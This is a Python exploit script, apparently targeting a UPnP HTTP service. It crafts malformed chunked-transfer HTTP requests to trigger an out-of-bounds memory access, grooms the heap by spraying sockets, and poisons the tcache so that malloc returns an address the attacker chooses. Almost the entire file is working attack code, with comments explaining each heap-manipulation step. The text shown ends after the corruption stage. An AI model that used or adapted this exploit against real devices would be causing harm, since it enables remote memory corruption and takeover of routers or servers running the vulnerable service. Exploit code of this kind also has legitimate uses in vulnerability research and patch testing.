#!/usr/bin/env python3
import pwn
import os
import sys
import socket
import time

TIME = 0.2
ALLOC_SIZE = 0x60-8

asciitxt = """
      ___           ___           ___           ___           ___                 
     /  /\         /__/\         /  /\         /__/\         /__/|          ___   
    /  /:/         \  \:\       /  /::\        \  \:\       |  |:|         /__/|  
   /  /:/           \__\:\     /  /:/\:\        \  \:\      |  |:|        |  |:|  
  /  /:/  ___   ___ /  /::\   /  /:/  \:\   _____\__\:\   __|  |:|        |  |:|  
 /__/:/  /  /\ /__/\  /:/\:\ /__/:/ \__\:\ /__/::::::::\ /__/\_|:|____  __|__|:|  
 \  \:\ /  /:/ \  \:\/:/__\/ \  \:\ /  /:/ \  \:\~~\~~\/ \  \:\/:::::/ /__/::::\  
  \  \:\  /:/   \  \::/       \  \:\  /:/   \  \:\  ~~~   \  \::/~~~~     ~\~~\:\ 
   \  \:\/:/     \  \:\        \  \:\/:/     \  \:\        \  \:\           \  \:\ 
    \  \::/       \  \:\        \  \::/       \  \:\        \  \:\           \__\/
     \__\/         \__\/         \__\/         \__\/         \__\/                
"""

# printer for hex values in argparse output
def hexarg(x):
    return int(x, 16)


# obligatory exploit printers
def xpr(msg):
    print(f"[+]: {msg}")

def debb(msg):
    print(f"[-] {msg}")

def xerr(msg):
    print(f"[!] ERROR: {msg}")

# padding helper
def pad(size, data):
    pad_byte = b"\x99"
    if len(data) > size:
        return data
    pad_size = size - len(data)
    new_data = data + (pad_byte * pad_size)
    if len(new_data) != size:
        raise Exception
    return new_data

# create a single socket with keepalive 
def singlesock(keepalive=True):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if keepalive:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    return sock

# create `count` sockets and return them in a list
def create_sockets(count):
    socks = []
    for i in range(0, count):
        socks.append(singlesock())
    return socks

# connect the sockets in the given list of sockets `sock_list`
def connect_sockets(sock_list, target_ip, port, timeout=None):
    for sock in sock_list:
        sock.settimeout(timeout)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        try:
            sock.connect((target_ip, int(port)))
        except ConnectionRefusedError:
            xerr("connection refused, check arguments or ensure server is up")
            sys.exit(1)

# disconnect a list of sockets
def disconnect_all(sock_list, reverse=False):
    if reverse:
        sock_list.reverse()
    for sock in sock_list:
        sock.close()

# send data on a list of open sockets
def sendsocks(socks_list, payload):
    for sock in socks_list:
        sock.send(payload, 2)
        time.sleep(TIME)

# Class representing a payload object to trigger the bug
class Payload(object):
    HTTP_HEADER_PADDING_BYTE = "K"
    def __init__(self,
                 chunk_size:int,
                 whitespace_size:int,
                 prepad_len:int=0,
                 http_header_pad:int=0,
                 inner_pad:int=0,
                 total_req_size:int=0,
                 ) -> None:
        self.http_chunk_size = chunk_size
        self.whitespace_pad_len = whitespace_size
        self.http_header_pad_len = http_header_pad
        self.post_chunk_pad_len = inner_pad

        self.prepad_len = prepad_len
        self.whitespace_buf = b""
        self.prepad_buf = b""
        self.http_headers = b""
        self.http_body = b""
        self.zero_chunk = self.make_chunk(0, 0)
        self.request_target_size = total_req_size
        self.complete = None

        if total_req_size > 0:
            self.compose_sized(self.whitespace_pad_len, self.request_target_size)

    @property
    def total_size(self):
        """
        to be called after one of the compose functions, which will fill in the buffers
        the zero chunk isn't put here explicity but is expected to have been combined with the
        http_body
        """
        return len(self.complete)

    def make_prepad(self, length:int, marker_char=""):
        """Create padding buf to prepend before HTTP request"""
        return b"A"*length

    def make_headers(self, padding: int):
        """Construct the HTTP headers for the request"""
        abuf = self.HTTP_HEADER_PADDING_BYTE * padding
        payload = "L AAAA\r\n"
        payload += "Transfer-Encoding:chunked\r\r"
        payload += f"{abuf}\r\n\r\n"
        return payload.encode()

    def make_chunk(self, chunk_size:int, inner_pad:int):
        """Construct an HTTP chunk for the request"""
        # return make_http_chunk(chunk_size, inner_pad, term=False)
        buf = "0" * inner_pad

        # convert the value from user to hex since this is how it will b interpreted by the application.
        target_chunk_hex = hex(chunk_size)[2:]
        payload = ""
        payload += f"{target_chunk_hex}\r\n"
        payload += f"{buf}\r\n"

        return payload.encode()

    def calculate_oob_read_size(self):
        """calculate how far OOB from the current req buf the given CHUNK_SIZE will allow us to read"""
        NL_LEN = 2
        body_len = len(self.http_body)
        chunk_size_hex_len = len(hex(self.http_chunk_size)) - len("0x")
        size_and_nl = chunk_size_hex_len + NL_LEN
        term_len = len(self.zero_chunk)
        return self.http_chunk_size - (body_len  - size_and_nl) - term_len

    def compose_sized(self, whitespace_len, size, with_zero_chunk=True):
        """compose a full payload while maintaining a constant request size"""
        whitespace_buf = b"\x20" * whitespace_len
        http_headers = self.make_headers(self.http_header_pad_len)
        http_chunk = self.make_chunk(self.http_chunk_size, self.post_chunk_pad_len)
        min_len = len(http_headers) + whitespace_len + len(http_chunk) + len(self.zero_chunk)

        if min_len > size:
            xpr(f"WARNING: minimum length required for request based on parameters exceeds defined target length of {size}")
        bytes_left = size - min_len
        pre_padding = self.make_prepad(bytes_left)

        self.whitespace_pad_len = whitespace_len
        self.whitespace_buf = whitespace_buf
        self.prepad_len = bytes_left
        self.prepad_buf = pre_padding
        self.http_headers = http_headers
        self.http_body = http_chunk
        if with_zero_chunk:
            self.http_body += self.zero_chunk
        self.complete = self.prepad_buf + self.http_headers + self.whitespace_buf + self.http_body
        return self.complete

    def compose(self,  whitespace_len, pre_pad=0, with_zero_chunk=True):
        """compose a full payload without regard for final request size"""
        self.prepad_len = pre_pad
        self.prepad_buf = self.make_prepad(pre_pad)
        self.whitespace_buf = b"\x20" * whitespace_len
        self.http_headers = self.make_headers(self.http_header_pad_len)
        self.http_body = self.make_chunk(self.http_chunk_size, self.post_chunk_pad_len)
        if with_zero_chunk:
            self.http_body += self.zero_chunk
        self.complete = self.prepad_buf + self.http_headers + self.whitespace_buf + self.http_body

    def dump(self):
        print(self.complete)


def fengshui(target_addr:int, server_ip:str, server_port:int):
    """
    this function is used to set the heap up in a favorable manner for the exploit.
    important points to know:
      * connecting a socket creates a upnphttp struct of 0x100 size
      * sending data on a socket will allocate that many bytes, up to 2048 at time;
      * the allocation that occurs on sending data use realloc()

    purpose:
      * clears the tcache bin for the given size and sprays the allocations
        with payloads containing the target address we want inserted into the bin.
      * forces allocs to start happening from the top chunk, so the allocations
        become sequential in memory.
      * sequential allocs happen around the 6-7 sprays in;
      * the socks at the end of this list are from the start of massaged region
      * free these LIFO from the tail to ensure our next allocs for the
        corruption will come from that region
    """

    # create and connect needed sockets before sending any data on any of them.
    # This should keep the allocations for the upnphttp structs separate from
    # the request buffer allocations
    GROOMING_ALLOCS = 10
    xpr(f"starting heap grooming round, using {GROOMING_ALLOCS} allocs...")
    dummies = create_sockets(GROOMING_ALLOCS)
    connect_sockets(dummies, server_ip, server_port)

    # This is the target address we want malloc to return after the chunk has
    # been corrupted
    where = pwn.pack(target_addr, 64)

    # create the fake chunk described above. pad with 16 bytes to skip the first
    # 2 8-byte fields which are `bk` and `fd`
    pre_pad = b"\x11" * 16 # \x11 is arbitrary
    core = pre_pad + where

    # pad the end of the payload with enough bytes to meet the size needed for
    # the target tcache bin allocations need to be kept the same size because
    # tcache bins must match exact sizes
    payload = pad(ALLOC_SIZE, core)

    # send the payload on all of the sockets we opened; this should result in 10
    # request buffer allocations; the last 3-4 will be allocated sequentially.
    sendsocks(dummies, payload)

    # free the last 4 allocs we made in reverse order to add those chunks to the
    # tcache bin for the matching size so they're returned to us on the next
    # allocations we make of the same size. by closing the sockets, we free
    # both the upnphttp structs and the request buffers they contain.
    dummies.pop().close()
    dummies.pop().close()
    dummies.pop().close()
    dummies.pop().close()

    # these need to be returned here to ensure they stay open for the remainder
    # of the exploit
    xpr(f"heap grooming complete")
    return dummies

def heap_corruption(malloc_return_target, target_ip, target_port):
    # a bit of setup and heap massaging to get things a bit more reliable
    dummies = fengshui(malloc_return_target, target_ip, target_port)

    # at this point we should have a heap layout that looks something like this
    #   - { dummy upnphttp }
    #   - { dummy upnphttp }
    #   - { dummy upnphttp }
    #   - { dummy upnphttp }
    #   - { free'd upnphttp }
    #   - { free'd upnphttp }
    #   - { free'd upnphttp }
    #   - { free'd upnphttp }
    #   - { alloc'd payload spray }
    #   - { alloc'd payload spray }
    #   - { alloc'd payload spray } <-- sequential alloc's should start around here
    #   - { alloc'd payload spray }
    #   - { free'd payload spray }  <-- these are free'd in reverse order so the
    #   - { free'd payload spray }      next alloc's we make will come from the
    #   - { free'd payload spray }      here
    #   - { free'd payload spray }

    # send the request to cause the corruption and kick off the exploit
    # we use 12 bytes of whitespace padding before the chunk size value because:
    #   - 8 bytes for `fd`
    #   - 8 bytes for `bk` (the -4 bytes to get to 16 are accounted for
    #     by the 4 bytes of the chunk size string '40\r\n' (0x40 = 64 chunk size)
    # chunk size of 64 since
    #   - the read will start ~8 bytes from the end of the req,
    #   - 16 bytes for size and prev_size chunk fields
    #   - 16 bytes for `fd` and `bk`
    #   - 8 bytes of payload data (the target addr)
    #   - total: ~48 bytes, go a bit higher for a safety margin just in case
    xpr(f"sending request to trigger the bug and corrupt the free'd chunks...")
    payload = Payload(chunk_size=64, whitespace_size=12, total_req_size=ALLOC_SIZE)
    corrupt_sock = singlesock()
    connect_sockets([corrupt_sock], target_ip, target_port)
    corrupt_sock.send(payload.complete, 2)
    time.sleep(TIME)
    corrupt_sock.close()
    xpr(f"tcache poison complete, the bad chunk should be ready for allocation")
    return dummies

